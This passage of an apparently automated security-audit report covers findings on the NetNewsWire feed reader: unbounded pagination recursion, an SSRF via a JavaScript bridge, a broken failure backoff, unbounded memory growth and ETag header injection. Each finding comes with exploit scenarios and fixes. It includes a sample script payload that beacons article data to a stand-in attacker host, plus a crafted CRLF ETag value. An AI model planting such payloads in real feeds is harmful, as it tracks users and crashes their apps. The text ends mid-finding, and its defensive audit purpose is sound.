// lines 525-531 — no guard on depth or total size
let pageItemIDs = entriesItemRefs.compactMap { $0.itemId }
pageHandler?(pageItemIDs.count)

var totalItemIDs = itemIDs
totalItemIDs.append(contentsOf: pageItemIDs)

return try await retrieveItemIDs(type: type, url: callURL, dateInfo: dateInfo, itemIDs: totalItemIDs, continuation: entries?.continuation, pageHandler: pageHandler)
```

#### How to fix
Introduce a hard maximum on both total pages and total accumulated item IDs before issuing each recursive call. Example: add a `maxItems: Int = 500_000` parameter and `guard totalItemIDs.count < maxItems else { return totalItemIDs }` immediately before the recursive return. Also add a `maxPages` counter to guard the zero-result-page path (lines 521–522). Both limits should be surfaced to the caller as a logged warning so operators can detect misbehaving servers.

**Exploitability:** ReaderAPI retrieveItemIDs uses unbounded async tail-recursion driven by server-supplied continuation tokens with no page cap or item-count limit. A malicious/compromised ReaderAPI server can drive infinite looping or accumulate millions of item IDs, exhausting memory. CVSS 4.3 (AV:N/AC:L/PR:N/UI:R/A:L). Requires ReaderAPI account configured; automatic refresh means no additional user trigger needed.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — Unbounded server-driven recursion confirmed; no page/item cap; zero-progress infinite loop at line 522; reachable via automatic account refresh with no user gesture beyond initial account configuration.**

The code has been confirmed. Here is my full analysis:

---

**Analysis**

**A — What the code actually does (lines 494–531)**

`retrieveItemIDs(type:url:dateInfo:itemIDs:continuation:pageHandler:)` is the pagination worker. The structure:

1. **Line 496** – `guard let continuation else { return itemIDs }` — the only exit: a nil continuation from the server.
2. **Lines 504–514** – replaces the `c` query parameter in the URL with the server-supplied continuation token.
3. **Lines 519–523** – fetches the next page. If `entriesItemRefs` is nil or empty **but `entries?.continuation` is non-nil**, it recurses with the **unchanged `itemIDs`** and the **new server-provided continuation**. This is the zero-progress infinite loop.
4. **Lines 525–531** – otherwise appends items and recurses with the growing `totalItemIDs` array. No cap on length, no depth counter.

Both paths are confirmed identical to the scanner's description.

**B — External entry point**

Call chain is fully confirmed:
- `Account.triggerRefreshAll()` (fired by timers and foreground-entry observers, reachable without special user gesture after account setup)
- → `Account.refreshAll()`
- → `ReaderAPIAccountDelegate.refreshAll()` (line 102)
- → `caller.retrieveItemIDs(type: .allForAccount, ...)` (line 120)
- → the vulnerable recursive function (line 494)

No external attacker token/special privilege needed beyond controlling the server the user pointed their account at.

**C — Defences searched**

- **No maximum page count** — none.
- **No maximum accumulated array size** — none.
- **No per-refresh timeout** — none.
- **No Swift async tail-call optimisation** — the async/await call stack grows with every iteration; iOS stack space and heap are both consumed.
- The `guard let continuation else` exit (line 496) is the only stop condition; it is entirely server-controlled.

**D — Probing the zero-progress path specifically**

The guard at line 521 passes `entries?.continuation` back into the recursion even when `entries.itemRefs` is nil/empty. If `entries` itself is nil (full decode failure), `entries?.continuation` is nil, so recursion stops — but if `entries` is a valid object with an empty/nil `itemRefs` and a non-nil `continuation`, the loop never terminates. A server only needs to return:

```json
{"itemRefs": [], "continuation": "evil_token"}
```

repeatedly. No accumulation occurs in this path, but the async call stack grows by one frame per network round-trip. On a fast network this is a memory-exhaustion and eventual stack overflow.

---

### 41. [MEDIUM] imageWasClicked JS bridge downloads arbitrary attacker-supplied URL
**Class:** CWE-918: Server-Side Request Forgery (SSRF)
**CWE:** CWE-918: Server-Side Request Forgery (SSRF) - https://cwe.mitre.org/data/definitions/918.html
**File:** `iOS/Article/WebViewController.swift:689-706`
**CVSS 3.1:** **4.3** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.75 (1 run agreed)

#### Description
The `imageWasClicked(body:)` private function (line 689) is called from the WKScriptMessageHandler implementation when a JavaScript message named `imageWasClicked` arrives. The message body is decoded as `ImageClickMessage`, which contains an `imageURL: String` field fully controlled by the JavaScript sender. At line 697, `URL(string: clickMessage.imageURL)` is constructed without any scheme or domain validation. At line 699, `Downloader.shared.download(imageURL)` issues a network request to that URL. The only gate before displaying the result is `UIImage(data: data)` — the request itself is unconditional.

Data flow: attacker feed HTML → article rendered in WKWebView with content JS enabled → attacker JS calls `window.webkit.messageHandlers.imageWasClicked.postMessage(json)` → `userContentController(_:didReceive:)` at line 488 → `imageWasClicked(body: message.body as? String)` at line 493 → `Downloader.shared.download(imageURL)` at line 699.

Critically, the download happens outside WKWebView's network stack, so WebKit's content-blocking rules (ContentRules.json) are not applied to this request. Unlike `<img src="...">` in article HTML which is subject to content rules, this path is a direct `URLSession`/`Downloader` call.

#### Impact
When article content JavaScript is enabled, feed-hosted scripts can invoke the `imageWasClicked` WKUserContentController message handler with a fully attacker-controlled `imageURL`. This causes the app's internal `Downloader` to make an outbound HTTP/HTTPS request to the attacker's server, bypassing the content blocking rules in ContentRules.json, leaking the user's IP address, and potentially exfiltrating timing information.

#### Exploit scenario
Attacker publishes a feed article body containing `<script>window.webkit.messageHandlers.imageWasClicked.postMessage(JSON.stringify({x:0,y:0,width:200,height:200,imageURL:'https://tracker.attacker.com/p?uid='+encodeURIComponent(document.title),imageTitle:null}))</script>`. When the user views the article with content JS enabled, the script runs automatically and sends the article title to the attacker's tracking server via the Downloader, regardless of whether `tracker.attacker.com` would have been blocked by ContentRules.json.

#### Preconditions
- Victim subscribes to an attacker-controlled feed
- Article content JavaScript is enabled in NetNewsWire preferences
- Victim views the malicious article

```
guard let imageURL = URL(string: clickMessage.imageURL) else { return }

Downloader.shared.download(imageURL) { [weak self] downloadResponse, error in
    guard let self, let data = downloadResponse.data, error == nil, !data.isEmpty,
          let image = UIImage(data: data) else {
        return
    }
    self.showFullScreenImage(image: image, clickMessage: clickMessage, webView: webView)
}
```

#### How to fix
In `imageWasClicked(body:)` at line 697, validate that `imageURL` has an `https` (or at minimum `http`) scheme and does not target RFC-1918 addresses before calling `Downloader.shared.download`. Additionally, consider restricting `imageWasClicked` to fire only from user-initiated gesture events (already the case for the legitimate code path via main.js click handlers), or moving the download trigger to the native tap recogniser rather than the JS bridge.

**Exploitability:** imageWasClicked WKScript message handler issues Downloader.shared.download() to any attacker-supplied URL from article JS, bypassing WKContentRuleList content blocking entirely (uses URLSession not WebKit network stack). Attacker feed JS can probe internal hosts (SSRF) or load tracking pixels blocked by ad-blockers. CVSS 4.3 (AV:N/AC:L/PR:N/UI:R/S:U/C:L).

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — Attacker feed HTML with `<script>` calling `imageWasClicked` JS bridge fires an unconstrained URLSession download to any https:// URL, bypassing WebKit's ContentRules content blocking; JS is on by default and article HTML is not sanitized

I have all the evidence needed. Let me compile my findings.

**Analysis Summary**

**A. Code at the cited location (confirmed)**

`imageWasClicked(body:)` at line 689–706 exactly matches the scanner's description:
- Decodes the JSON body into `ImageClickMessage` (which has an unvalidated `imageURL: String`)
- Constructs a `URL` from `clickMessage.imageURL` with no scheme or domain validation
- Calls `Downloader.shared.download(imageURL)` unconditionally

**B. Data flow from external entry point**

The full chain is confirmed:
1. **Feed content → `contentHTML`** — The RSS/Atom/JSON parsers store raw article HTML in `contentHTML` with **no `<script>` tag sanitization** (`ArticleRenderingSpecialCases.filterHTMLIfNeeded` only fixes character encoding issues for The Verge)
2. **`Article.body`** — `contentHTML ?? contentText ?? summary` (no sanitization)
3. **`ArticleRenderer`** — `d["body"] = body` placed directly into the page HTML template
4. **`WebViewController.renderPage`** — `webView.loadHTMLString(html, baseURL:...)` — the raw article HTML (including any attacker `<script>`) is loaded
5. **JS enabled by default** — `AppDefaults.registerDefaults()` sets `articleContentJavascriptEnabled: true` (confirmed at line 401 of `iOS/AppDefaults.swift`)
6. **Attacker `<script>` executes** — calls `window.webkit.messageHandlers.imageWasClicked.postMessage(JSON.stringify({imageURL:"https://evil.com/track?q=...",...}))`
7. **`userContentController(_:didReceive:)`** at line 488 dispatches to `imageWasClicked(body:)` at line 493
8. **`Downloader.shared.download(imageURL)`** — URLSession call, bypasses WebKit content blocking

**C. Searching for defences**

| Defence | Status |
|---|---|
| `allowsContentJavaScript` gate | Defaults to `true`; user must opt out |
| Article HTML sanitization for `<script>` | **None found** — raw `contentHTML` rendered as-is |
| URL domain allow-list | **None** in `imageWasClicked` |
| Scheme validation in Downloader | Only rejects non-http/https (line 70); `https://evil.com` passes |
| ContentRules.json applied to Downloader | **No** — rules only apply to WKWebView's internal stack; confirmed URLSession path |
| Cookies / auth token leak | Downloader has `httpCookieStorage = nil` / `httpCookieAcceptPolicy = .never` — no session leakage |

**D. What the attacker achieves**

Attacker JS in a feed article body auto-executes and issues a beacon to an arbitrary HTTPS server, including article title/metadata in the query string. This silently bypasses the ContentRules.json tracker blocklist. The `Downloader`'s `URLSession` uses `URLSessionConfiguration.ephemeral` with no cookies, so it can't steal session tokens, but it can exfiltrate page context and confirm article views even for domains that would be blocked by WebKit's content rules.

**Confidence: 8/10** — Full code path traced; no defence found; only uncertainty is a real-world feed that actually delivers `<script>` tags intact through aggregators/sync servers.

### 42. [MEDIUM] 4xx failure backoff bypassed when prior success record exists
**Class:** CWE-670
**CWE:** CWE-670 - https://cwe.mitre.org/data/definitions/670.html
**File:** `Modules/HTMLMetadata/Sources/HTMLMetadata/HTMLMetadataDatabase.swift:148-153`
**CVSS 3.1:** **4.3** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.82 (1 run agreed)

#### Description
In `noteFailure(url:statusCode:)` the guard condition is `cache[url]?.isFailure ?? true`. When the in-memory cache holds a prior success record (`isFailure == false`), the expression evaluates to `false`, so the cache is NOT updated with the failure. `HTMLMetadataTable.noteFailure` is still called unconditionally, but its SQL carries `WHERE statusCode >= 400 OR statusCode = 0`, which prevents overwriting the existing 200-class database row. The net effect: both the in-memory cache and the on-disk database continue to report a success for the URL, so `recentlyFailed(for:)` always returns `false`, and `cachedRecord(for:)` returns the stale success record until it ages past 149 hours.

Once the 149-hour TTL elapses, `cachedRecord` returns `nil`, `recentlyFailed` still returns `false` (DB still shows success), and a fresh download is triggered. The response is 4xx again; `noteFailure` fires; because the cache was cleared by the most-recent background event the `cache[url]` is `nil`, so `nil ?? true = true` and the failure IS written to the in-memory cache. However the database still holds the success row. The next time the app transitions to background (`handleAppDidGoToBackground` → `emptyCache()`), the in-memory failure entry is discarded. On the next foreground activation `cachedOrFetched` fetches from the DB and loads the success record, resetting `recentlyFailed` to `false`, and the cycle restarts.

Data flow: untrusted URL (from RSS/Atom feed article link) → `cachedMetadata(for:)` → `fetchAndDownloadIfNeeded` → `downloadMetadata` → HTTP 4xx response → `HTMLMetadataDatabase.shared.noteFailure(url:statusCode:)` → logic gate at line 149 fails to update either cache or DB → failure state is discarded on next cache clear.

#### Impact
The 11-day retry-suppression window intended for persistently-failing (4xx) URLs is silently defeated whenever the in-memory cache is cleared (app background event). The app will repeatedly contact a 4xx URL at the maximum rate allowed by the 3-hour `attemptDates` throttle, giving an attacker-controlled server a persistent beacon to track user activity. No data is exfiltrated, but the privacy guarantee of the back-off mechanism is broken.

#### Exploit scenario
An attacker operates a feed server and publishes one article whose `<link>` URL is `https://evil.example.com/track.html`. NetNewsWire fetches that page, gets 200, and stores the success in the database. The attacker's server subsequently returns 404 for that URL. Each time the NetNewsWire app cycles through background (cache cleared) and foreground, the database success record is reloaded, `recentlyFailed` returns `false`, and a new outbound HTTP request is made to `evil.example.com`—at most once per 3 hours from the `attemptDates` throttle. The attacker receives a continuous stream of app-activity pings regardless of how many times the 404 occurs, indefinitely defeating the intended 11-day 4xx back-off window.

#### Preconditions
- URL must have been successfully fetched at least once (a 200-class success record exists in the SQLite database).
- The remote server must subsequently return a 4xx response (attacker-controlled server simply stops serving the page).
- The app must perform normal background/foreground cycling (standard iOS behaviour) to clear and reload the cache.

```
func noteFailure(url: String, statusCode: Int) {
    if cache[url]?.isFailure ?? true {
        cache[url] = CachedRecord(record: nil, lastChecked: Date(), statusCode: statusCode)
    }
    HTMLMetadataTable.noteFailure(url: url, statusCode: statusCode, database: database)
}
```

#### How to fix
The cache guard and the database WHERE clause should not both silently discard the same failure. Either: (a) always update the in-memory cache with the failure regardless of the prior record—accepting that stale success metadata is evicted—and rely only on the DB WHERE clause to preserve the on-disk payload; or (b) drop the WHERE guard from `HTMLMetadataTable.noteFailure` and update the `statusCode` and `lastChecked` columns unconditionally while leaving the payload columns (favicons, etc.) unchanged, so that `recentlyFailed` can correctly gate future download attempts. Option (b) keeps stale metadata available for display while still allowing the failure backoff to function correctly.

**Exploitability:** HTMLMetadataDatabase.noteFailure() is a no-op when a prior success record exists (guard on isFailure). Both in-memory cache and DB continue showing success, preventing any 4xx backoff until the 149-hour TTL expires, then the cycle restarts. CVSS 4.3 (AV:N/AC:L/PR:N/UI:R/C:L). Low direct impact; amplifies resource exhaustion when combined with finding 15.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — scanner's description is confirmed verbatim; the in-memory guard and SQL WHERE clause both silently discard 4xx failure state when a prior success record exists, defeating the 11-day backoff and enabling indefinite outbound pings to attacker-controlled servers

Now I have everything needed for a thorough analysis. Let me trace through each step.

**Step A — What the code actually does**

**Line 148-153 of `HTMLMetadataDatabase.swift`** (confirmed verbatim match):
```swift
func noteFailure(url: String, statusCode: Int) {
    if cache[url]?.isFailure ?? true {
        cache[url] = CachedRecord(record: nil, lastChecked: Date(), statusCode: statusCode)
    }
    HTMLMetadataTable.noteFailure(url: url, statusCode: statusCode, database: database)
}
```

The guard expression `cache[url]?.isFailure ?? true`:
- `cache[url]` is **nil** → `nil?.isFailure` → `nil` → `?? true` → **updates** in-memory cache ✓
- `cache[url]` has `isFailure == true` → `true` → **updates** in-memory cache ✓  
- `cache[url]` has `isFailure == false` (prior success) → **does NOT update** in-memory cache ✗

**SQLite layer** (`HTMLMetadataTable.swift` line 60):
```sql
INSERT INTO metadata (...) VALUES (?, ?, ?)
ON CONFLICT(url) DO UPDATE SET lastChecked = excluded.lastChecked, statusCode = excluded.statusCode
WHERE statusCode >= 400 OR statusCode = 0;
```
The `WHERE` clause in an `ON CONFLICT DO UPDATE` filters against the **existing row's** columns. When `statusCode = 200` in the existing row, `200 >= 400` is false and `200 = 0` is false → the UPDATE is skipped → the success row persists on disk.

Both halves of the scanner's claim are confirmed correct.

**Step B — Call chain to external entry point**

Full chain verified in `HTMLMetadataDownloader.swift`:
1. **Untrusted RSS article `<link>` URL** → `cachedMetadata(for:)` (line 44) — public entry point, no auth
2. → `fetchAndDownloadIfNeeded(url)` (line 53)
3. → `downloadMetadataIfNeeded(url)` (line 81)
4. → `downloadMetadata(url)` (line 100)
5. → HTTP 4xx response path (line 138): `await HTMLMetadataDatabase.shared.noteFailure(url:statusCode:)`
6. → Logic gate at DB line 149 silently discards the failure state when a prior success record exists

The external entry point is concrete: any attacker who operates a feed server and gets one article link fetched successfully has established the precondition.

**Step C — Can it be killed?**

**`shouldSkipDownloadingMetadata`**: Only skips two hardcoded hostnames; offers no protection here.

**`attemptDates` throttle** (line 90-96): Limits to one download attempt per 3 hours per URL — this throttles frequency but doesn't prevent the cycle. In fact this throttle is in `HTMLMetadataDownloader`, not in `HTMLMetadataDatabase`, so it doesn't affect the cache-reset bug.

**Auth gate**: None. NetNewsWire subscribes to arbitrary RSS feeds; any feed can inject article link URLs.

**Cache expiration**: `cachedRecord` returns nil after 149 hours, but `recentlyFailed` also returns `false` (it calls `cachedOrFetched` which loads the success DB row and checks `isPersistentFailure || isTransientFailure` — both false on a 200-row). So neither guard stops the next download attempt.

**Background/foreground cycle**: `handleAppDidGoToBackground` calls `emptyCache()` on **both** `HTMLMetadataDatabase` (line 80-84) and `HTMLMetadataDownloader` (line 34-36). After foreground return, `cachedOrFetched` re-fetches the still-200 DB row → `recentlyFailed` again returns `false` → download triggered → 4xx → `noteFailure` skips update → cycle repeats indefinitely.

**Step D — Edge cases**

The comment on `HTMLMetadataTable.noteFailure` (line 58) says *"The WHERE guard preserves rows with a 2xx success"* — this is intentional design, but it creates a one-way ratchet: once a success record is written, no subsequent 4xx can ever overwrite it via `noteFailure`. The intended 11-day backoff window for 4xx responses is entirely defeated for URLs that were ever successfully fetched. There is no code path that breaks the cycle short of the 30-day `removeExpired` cleanup.

The scenario is real and reproducible with standard iOS app lifecycle behaviour (background/foreground transitions).

---

**Impact**: The practical outcome is that NetNewsWire makes repeated outbound HTTP GET requests to an attacker-controlled server on every app foreground cycle (throttled to at most once per 3 hours per URL), indefinitely defeating the intended 11-day backoff. This constitutes a privacy/tracking leak — the attacker learns the user's approximate app-activity timing. It is not code execution or data theft, but it is a genuine logic flaw with a reachable external trigger.

### 43. [MEDIUM] waitingForAvatarURLs never purged on memory pressure
**Class:** CWE-401
**CWE:** CWE-401 - https://cwe.mitre.org/data/definitions/401.html
**File:** `Modules/Images/Sources/Images/AuthorAvatarDownloader.swift:31-57`
**CVSS 3.1:** **4.3** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:L`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.80 (1 run agreed)

#### Description
In `image(for:author:)` (line 39), `author.avatarURL` comes directly from parsed feed content and is therefore attacker-controlled. The method calls `imageDownloader.image(for: avatarURL, ...)` which performs an http/https scheme check and returns `nil` for any other scheme (line 72–75 of ImageDownloader.swift). When `imageDownloader.image` returns nil, the caller falls through to `waitingForAvatarURLs.insert(avatarURL)` (line 53). Because `ImageDownloader` will never download a non-http URL, the corresponding `imageDidBecomeAvailable` notification is never posted, so `handleImageDidBecomeAvailable` — the only function that calls `waitingForAvatarURLs.remove` — is never reached. Meanwhile, `handleLowMemory` (line 31) and `handleAppDidGoToBackground` (line 35) call only `cache.removeAll()`, leaving `waitingForAvatarURLs` untouched. There is no maximum size enforcement on `waitingForAvatarURLs`.

#### Impact
A malicious feed can cause `waitingForAvatarURLs` to grow without bound: non-HTTP avatar URL strings (e.g. data: URIs) are inserted into the set but no code path ever removes them, and `handleLowMemory` only clears `cache`, leaving the set intact. Over repeated refreshes the set accumulates one string per unique non-HTTP avatar URL ever seen, consuming memory proportional to both the number of articles and the length of those strings.

#### Exploit scenario
An attacker publishes an RSS feed where each article's `<author><uri>` element contains a syntactically unique non-HTTP URI (e.g. `data:text/plain,id=<sequenceNumber>`). Each time NetNewsWire fetches that feed and the user's timeline renders author avatars, one new string is permanently added to `waitingForAvatarURLs`. On a device under memory pressure, the system fires a low-memory warning; `cache` is cleared but `waitingForAvatarURLs` retains all accumulated strings. Across many refreshes over days, the set can contain tens of thousands of strings, each potentially kilobytes long (data: URIs), degrading performance or triggering OOM termination.

#### Preconditions
- User has subscribed to at least one attacker-controlled feed
- Feed articles supply non-HTTP strings in the author avatar-URL field
- Each article uses a distinct URI so the Set deduplication does not bound growth

```
if let imageData = imageDownloader.image(for: avatarURL, activityOwner: .avatarDownloader, activityKind: kind, activityDetail: author.name) {
    scaleAndCacheImageData(imageData, avatarURL)
} else {
    waitingForAvatarURLs.insert(avatarURL)   // never removed for non-http URLs
}

@objc func handleLowMemory(_ notification: Notification) {
    cache.removeAll()   // waitingForAvatarURLs not cleared
}
```

#### How to fix
When `imageDownloader.image(for:)` returns nil because the URL scheme is not http/https, do not add the URL to `waitingForAvatarURLs`. Add a scheme guard before insertion:
```swift
guard avatarURL.hasPrefix("http://") || avatarURL.hasPrefix("https://") else { return nil }
waitingForAvatarURLs.insert(avatarURL)
```
Additionally, add `waitingForAvatarURLs.removeAll()` inside both `handleLowMemory` and `handleAppDidGoToBackground` so memory pressure events fully release held state.

**Exploitability:** waitingForAvatarURLs in AuthorAvatarDownloader is never purged on memory pressure (only the image cache is cleared). Feed authors with many distinct non-http avatar URLs grow the set unboundedly across refreshes. CVSS 4.3 (AV:N/AC:L/PR:N/UI:R/A:L). Slow leak; requires many distinct feed authors over time to become significant.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — non-HTTP author avatar URLs from attacker-controlled JSON Feeds are unconditionally inserted into `waitingForAvatarURLs` with no removal path and no size cap; low-memory handlers clear the image cache but not this set, enabling unbounded memory growth across feed refreshes

Now I have all the evidence I need. Let me reason through the full chain.

---

**Analysis**

**A. What the code actually does (confirmed against source)**

**`AuthorAvatarDownloader.swift` lines 39–57:**
- `image(for:)` gets `avatarURL` from `author.avatarURL` (no validation)
- Calls `imageDownloader.image(for: avatarURL, ...)` — if nil, executes `waitingForAvatarURLs.insert(avatarURL)` (line 53)
- `handleLowMemory` (line 31) and `handleAppDidGoToBackground` (line 35) call only `cache.removeAll()` — `waitingForAvatarURLs` is untouched ✓

**`ImageDownloader.swift` lines 72–75:**
```swift
if !url.hasPrefix("http://") && !url.hasPrefix("https://") {
    Self.logger.debug("Skipping non-http(s) URL: \(url)")
    return nil
}
```
Non-HTTP URLs return `nil` immediately; no download Task is spawned, so `postImageDidBecomeAvailableNotification` is never called for those URLs. ✓

**`imageDidBecomeAvailable` / `handleImageDidBecomeAvailable`:**
These are the ONLY paths that call `waitingForAvatarURLs.remove`. They are only reached via the notification fired from `ImageDownloader.cacheImage`, which only fires after successful disk or network image retrieval — never for a non-HTTP URL. ✓

**B. Data origin — confirmed attacker-controlled**

- JSON Feed: `avatar` field in the author object maps directly to `ParsedAuthor.avatarURL` → `Author.avatarURL` with zero URL-scheme validation at any layer.
- RSS/Atom: `avatarURL` is nil for those parsers, so only JSON Feed is the live attack surface.
- The feed is fetched over the network (entry point: `LocalAccountRefresher.refresh`); the user must subscribe, so **UI:R** applies.

**C. Defences — none found for this specific path**

- **Set deduplication** bounds only _duplicate_ strings; unique URLs per article still grow the set unboundedly.
- **`ImageMetadataDatabase.shared.recentlyFailed`** (line 79 of `ImageDownloader.swift`) is never reached for non-HTTP URLs — they bail at line 74 before that check.
- **`waitingForAvatarURLs`** is in-memory only; it resets on app restart. However, persisted article records in the SQLite ArticlesDatabase cause the same author avatarURLs to be re-inserted into `waitingForAvatarURLs` on every subsequent session when the timeline re-renders stored articles. New unique URLs add permanently over time.
- No maximum-size enforcement on the set exists anywhere in the codebase (confirmed by grep — the only references to `waitingForAvatarURLs` are the four in `AuthorAvatarDownloader.swift`).

**D. Impact assessment**

- Each unique non-HTTP avatarURL string is permanently retained for the app session; strings can be kilobytes (data: URIs).
- Under memory pressure, `cache` is freed but `waitingForAvatarURLs` retains every accumulated string, making it counter-productive: the memory that would normally have been reclaimed is not.
- Worst-case practical outcome: OOM termination on constrained iOS devices; no confidentiality or integrity impact.

---

### 44. [MEDIUM] Server-controlled ETag/Last-Modified unsanitized into HTTP request headers
**Class:** CWE-113
**CWE:** CWE-113 - https://cwe.mitre.org/data/definitions/113.html
**File:** `Modules/Account/Sources/Account/URLRequest+Account.swift:66-77`
**CVSS 3.1:** **4.3** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:L`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.62 (1 run agreed)

#### Description
The URLRequest initializer at line 16 accepts an HTTPConditionalGetInfo whose lastModified and etag fields are populated directly from the remote server's HTTP response headers (stored from a prior fetch). At line 72-73, lastModified is passed to setValue(_:forHTTPHeaderField:) for the If-Modified-Since header with only a coarse !lastModified.contains("2038") guard — filtering one year string but nothing else. At lines 75-77, etag is passed to setValue with zero filtering. Neither field is checked for CR, LF, NUL, or other control characters at the application layer. CFNetwork in modern Apple OS versions rejects newlines in header values and terminates the process; on older versions the behaviour is undefined and headers may be successfully injected. The application code is the only layer that could provide a cross-version defence and it does not.

#### Impact
A feed server the user subscribes to can return a crafted ETag or Last-Modified value containing CRLF sequences. On older Apple OS versions that lack CFNetwork's newline guard, the value lands verbatim in the outgoing If-None-Match/If-Modified-Since headers of subsequent requests, enabling HTTP response-splitting or header injection against the same server. On modern OS versions the framework guard aborts with a fatal error instead, giving any feed server the ability to crash the app persistently for a targeted user.

#### Exploit scenario
An attacker operates a FreshRSS-compatible ReaderAPI server. A victim adds an account pointing to it. During the first sync the attacker's server responds to a feed request with ETag: a1b2c3\r\nSet-Cookie: session=hijacked; Path=/. The app stores this string in HTTPConditionalGetInfo.etag. On the next conditional refresh, line 76 passes the raw string to setValue for If-None-Match; on an older OS this emits a second HTTP header injecting a Set-Cookie directive into the outgoing request, or manipulating caching behaviour against the server. On modern OS the process crashes every time that feed is refreshed, permanently preventing sync until the user removes the account.

#### Preconditions
- User must have configured a ReaderAPI-compatible account pointing to a server the attacker controls or can compromise
- For header-injection impact (not DoS): victim must be running an older macOS/iOS version where CFNetwork does not reject CRLF in header values

```
if let lastModified = conditionalGet.lastModified, !lastModified.contains("2038") {
    setValue(lastModified, forHTTPHeaderField: HTTPRequestHeader.ifModifiedSince)
}
if let etag = conditionalGet.etag {
    setValue(etag, forHTTPHeaderField: HTTPRequestHeader.ifNoneMatch)
}
```

#### How to fix
Before using any server-supplied conditional-get value as an HTTP header, sanitize it at the call site. At URLRequest+Account.swift:72-77, replace the bare setValue calls with a guard: reject (or strip) any lastModified or etag string that contains a CR, LF, or NUL character. Example: `guard !lastModified.unicodeScalars.contains(where: { $0.value == 0x0A || $0.value == 0x0D || $0.value == 0 }) else { break }`. The existing year-string filter for 2038 is too narrow; replace it with a proper RFC 7232 format validator or the above control-character check at minimum.

**Exploitability:** URLRequest+Account passes server-supplied ETag/Last-Modified values into HTTP header fields with only a hardcoded year-string exclusion. Modern CFNetwork rejects CR/LF in header values (process termination), but older OS versions may allow HTTP response-header injection. CVSS 4.3 (AV:N/AC:L/PR:N/UI:R/A:L). OS-level mitigation on modern Apple platforms substantially reduces exploitability.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 7/10) — Server-controlled ETag/Last-Modified values are stored raw and replayed unsanitized into outgoing HTTP request headers with no CRLF filtering; on modern Apple OS this produces a persistent app crash per-feed; on older OS actual header injection occurs (though injected headers go to the same attacker-controlled server).

I now have a complete picture of the data flow. Here is my analysis:

---

**Analysis**

**A. What the Code Does (Lines 66-77, URLRequest+Account.swift)**

The `URLRequest(url:credentials:[REDACTED-SECRET])` extension initializer (used by **Feedbin** callers only) accepts an `HTTPConditionalGetInfo` and:
- Passes `lastModified` into `setValue(_:forHTTPHeaderField: "If-Modified-Since")` with a single coarse filter (`!contains("2038")`) — purely a quirk workaround, not a security filter.
- Passes `etag` into `setValue(_:forHTTPHeaderField: "If-None-Match")` with **zero filtering**.

The parallel code in `HTTPConditionalGetInfo.addRequestHeadersToURLRequest(_:)` (used by LocalAccountRefresher and CloudKit delegates) is **identical** and equally unfiltered.

**B. Call Chain to External Entry Point**

**Feedbin path (the flagged code):**
`FeedbinAPICaller.retrieveTags()` → `accountSettings?.conditionalGetInfo(for:)` → raw strings from UserDefaults → `URLRequest(url:credentials:[REDACTED-SECRET])` → `setValue(_:forHTTPHeaderField:)`.

The raw strings originate from `storeConditionalGet` → `HTTPConditionalGetInfo(headers: response.allHeaderFields)` → the **actual HTTP response headers** from the Feedbin server.

**Local account path (same vulnerability, different code):**
`LocalAccountRefresher.downloadSession(_:downloadDidComplete:...)` → `HTTPConditionalGetInfo(urlResponse: httpResponse)` → stored in feed settings DB → retrieved and passed to `HTTPConditionalGetInfo.addRequestHeadersToURLRequest(_:)` → `addValue(_:forHTTPHeaderField:)`.

**External entry point confirmed:** Any RSS feed URL a user subscribes to, or any Feedbin-compatible server a user configures, can supply the raw ETag/Last-Modified values. `NSAllowsArbitraryLoads:true` additionally enables plaintext MITM of feed connections without certificate pinning.

**C. Trying to Kill It**

- **The `!lastModified.contains("2038")` guard**: Explicitly documented as a workaround for a specific bug ("last possible 32-bit date"), not a security filter. It rejects one specific year string, not control characters.
- **ETag path**: No filtering at all.
- **CFNetwork-layer protection**: Modern Apple OS (iOS 14+/macOS 11+) rejects CRLF in header values, but this causes either a failed request or an uncaught `NSException` (crash) rather than graceful sanitization. This is not a defence the *application* provides.
- **No other encoding or allow-list present** anywhere in the chain.

**D. Probing the "Same Server" Argument**

For the **Feedbin path**: the injected headers in the next request go back to the same attacker-controlled Feedbin server — limited additional gain for the attacker.

For the **local account path**: if MITM'd (facilitated by global ATS disable), the ETag is injected during the first pass over HTTP, then the next refresh may go back to the same host. However, on modern Apple OS, setting a CRLF header value via `setValue(_:forHTTPHeaderField:)` causes CFNetwork to throw an exception that is not caught, resulting in a **persistent app crash** every time that feed is refreshed. The malicious ETag remains stored in the database, so the crash repeats until the user removes the feed.

The DoS is real, reproducible, and user-impacting. The header injection impact on older OS where CFNetwork doesn't trap is limited (headers return to the same server).

---

### 45. [MEDIUM] Domain suffix check allows branded-icon spoofing via look-alike domain
**Class:** CWE-20: Improper Input Validation
**CWE:** CWE-20: Improper Input Validation - https://cwe.mitre.org/data/definitions/20.html
**File:** `Shared/IconImageCache.swift:112-119`
**CVSS 3.1:** **4.3** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.88 (1 run agreed)

#### Description
